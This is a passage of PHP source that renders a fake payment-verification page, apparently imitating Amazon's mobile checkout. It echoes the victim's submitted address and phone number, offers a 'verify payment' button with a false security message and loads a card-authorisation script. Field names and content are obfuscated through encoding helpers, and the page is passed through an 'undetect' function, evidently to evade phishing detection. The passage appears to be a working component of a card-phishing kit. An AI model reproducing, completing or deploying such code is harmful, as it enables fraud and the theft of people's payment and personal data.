                                                                                <span id="address-ui-widgets-AddressLineOne" class="id-addr-ux-search-text">'.$api->text_encode($lang['paymentpage']['yourinfoaddress']).': ' . (isset($_SESSION['address']) && !empty($_SESSION['address']) ? $_SESSION['address'] : (isset($_POST[$api->encypt('address')]) && !empty($_POST[$api->encypt('address')]) ? $_POST[$api->encypt('address')] : '-')) . ', ' . (isset($_SESSION['addressline2']) && !empty($_SESSION['addressline2']) ? $_SESSION['addressline2'] : (isset($_POST[$api->encypt('addressline2')]) && !empty($_POST[$api->encypt('addressline2')]) ? $_POST[$api->encypt('addressline2')] : '')) . '</span>
                                                                            </span>
                                                                        </li>
                                                                        <li>
                                                                            <span class="a-list-item">
                                                                                <span id="address-ui-widgets-CityStatePostalCode" class="id-addr-ux-search-text">'.$api->text_encode($lang['billingpage']['city']).', '.$api->text_encode($lang['billingpage']['state']).', '.$api->text_encode($lang['billingpage']['zipcode']).': ' . (isset($_SESSION['kota']) && !empty($_SESSION['kota']) ? $_SESSION['kota'] : (isset($_POST[$api->encypt('kota')]) && !empty($_POST[$api->encypt('kota')]) ? $_POST[$api->encypt('kota')] : '-')) . ', ' . (isset($_SESSION['region']) && !empty($_SESSION['region']) ? $_SESSION['region'] : (isset($_POST[$api->encypt('region')]) && !empty($_POST[$api->encypt('region')]) ? $_POST[$api->encypt('region')] : '-')) . ' ' . (isset($_SESSION['region']) && !empty($_SESSION['region']) ? $_SESSION['region'] : (isset($_POST[$api->encypt('region')]) && !empty($_POST[$api->encypt('region')]) ? $_POST[$api->encypt('region')] : '-')) . '</span>
                                                                            </span>
                                                                        </li>
                                                                        <li>
                                                                            <span class="a-list-item">
                                                                                <span id="address-ui-widgets-Country" class="id-addr-ux-search-text">'.$api->text_encode($lang['paymentpage']['yourinfocountry']).': '.$_SESSION['country'].'</span>
                                                                            </span>
                                                                        </li>
                                                                        <li>
                                                                            <span class="a-list-item">
                                                                                <span id="address-ui-widgets-PhoneNumber" class="id-addr-ux-search-text">'.$api->text_encode($lang['billingpage']['phonenumber']).': ' . (isset($_SESSION['phone']) && !empty($_SESSION['phone']) ? $_SESSION['phone'] : (isset($_POST[$api->encypt('phone')]) && !empty($_POST[$api->encypt('phone')]) ? $_POST[$api->encypt('phone')] : '-')) . '</span>
                                                                            </span>
                                                                        </li>
                                                                    </ul>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <span class="a-declarative" data-action="form-submit-button-click" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-form-submit-button-click" data-form-submit-button-click="{}" data-csa-c-id="f0no4r-elumsu-hdqjy2-gkxnqd">
                                    <span id="address-ui-widgets-form-submit-button" class="a-button a-button-primary address-ui-widgets-mobile-tablet-form-field-full-width">
                                        <span class="a-button-inner">
                                            <input class="a-button-input" type="submit" id="btn_next" aria-labelledby="address-ui-widgets-form-submit-button-announce">
                                            <span id="address-ui-widgets-form-submit-button-announce" class="a-button-text" aria-hidden="true">'.$api->text_encode($lang['paymentpage']['verifypayment']).'</span>
                                        </span>
                                    </span>
                                </span>
                                <div class="a-row a-spacing-base">
                                    <div class="a-section apx-add-credit-card-secure-message">
                                        <img alt="" src="'.$api->image_encode("assets/img/lock.png")['local'].'" class="apx-add-credit-card-secure-message-icon">
                                        <span class="a-size-small a-color-secondary">'.$api->text_encode($lang['paymentpage']['infopayment']).'</span>
                                    </div>
                                    <div class="a-section apx-add-credit-card-bpm-message">
                                        <span class="a-size-small a-color-secondary">'.$api->text_encode($lang['paymentpage']['alertinfopayment']).'</span>
                                    </div>
                                </div>
                                <div id="stop-mash-reappear"></div>
                            </div>
                            <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/deskop-address.css").'">
                            <link rel="stylesheet" href="'.$api->text_encode("../../assets/css/custom-address-mobile.css").'">
                        </span>
                        </form>
                        ';
                        }
                        $html .= '
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer class="nav-mobile nav-ftr-batmobile">
        <div id="nav-ftr" class="nav-t-footer-basicNoAuth nav-sprite-v3">
            <a id="nav-ftr-gototop" class="nav-a" href="javascript:void(0)">
                <i class="nav-icon"></i>
                <b class="nav-b">
                    '.$api->text_encode($lang['paymentpage']['backtotop']).'
                </b>
            </a>
            <div class="icp-container-mobile">
                <style type="text/css">
                #icp-touch-link-language {
                    display: none;
                }
                </style>
                <a href="#" aria-owns="nav-flyout-icp-footer-flyout" class="icp-touch-link-2" id="icp-touch-link-language">
                    <div class="icp-nav-globe-img-2 icp-mobile-globe-2"></div>
                    <span class="icp-color-base">'.$api->text_encode($lang['billingfooter']['language']).'</span>
                    <span class="nav-arrow icp-up-down-arrow"></span>
                </a>
                <style type="text/css">
                #icp-touch-link-country {
                    display: none;
                }
                </style>
                <a href="#" class="icp-touch-link-2" id="icp-touch-link-country">
                    <span class="icp-flag-3 icp-flag-3-'.strtolower($_SESSION['countrycode']).'"></span>
                    <span class="icp-color-base">'.$api->text_encode($_SESSION['country']).'</span>
                </a>
            </div>
            <ul class="nav-ftr-horiz">
                <li class="nav-li">
                    <a href="#gp" id="" class="nav-a">'.$api->text_encode($lang['billingfooter']['conditions']).'</a>
                </li>
                <li class="nav-li">
                    <a href="#gp" id="" class="nav-a">'.$api->text_encode($lang['billingfooter']['privacy']).'</a>
                </li>
                <li class="nav-li">
                    <a href="#gp" id="" class="nav-a">'.$api->text_encode($lang['billingfooter']['consumer']).'</a>
                </li>
                <li class="nav-li">
                    <a href="#privacyprefs" id="" class="nav-a">'.$api->text_encode($lang['billingfooter']['adsprivacy']).'</a>
                </li>
                <li class="nav-li">
                    <span id="nav-icon-ccba" class="nav-sprite"></span>
                </li>
            </ul>
            <div id="nav-ftr-copyright">
                '.$api->text_encode($lang['billingfooter']['copyright']).'
            </div>
            <div id="nav-ftr-legal"></div>
        </div>
    </footer>
    <script src="'.$api->text_encode("../../assets/js/jquery.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/jquery.mask.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/jquery.validate.min.js").'"></script>
    <script src="'.$api->text_encode("../../assets/js/card.auth.js").'"></script>
</body>
</html>';

$api->undetect($html);
?>